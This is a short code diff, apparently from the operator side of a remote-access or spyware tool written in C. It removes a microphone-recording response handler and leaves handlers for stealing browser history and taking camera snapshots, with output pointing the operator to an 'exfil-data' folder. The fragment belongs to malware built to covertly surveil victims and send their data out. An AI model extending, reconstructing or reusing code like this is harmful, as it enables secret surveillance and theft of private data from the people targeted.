@@ -48,14 +48,6 @@ void handle_history_steal_response(Packet *resp, const char *save_dir)
            resp->payload_len, resp->payload);
 }
 
-void handle_mic_record_response(Packet *resp, const char *save_dir)
-{
-    (void)save_dir;
-    if (!resp) return;
-    printf("<%.*s — check exfil-data/ on host>\n\n",
-           resp->payload_len, resp->payload);
-}
-
 void handle_camera_snapshot_response(Packet *resp, const char *save_dir)
 {
     (void)save_dir;
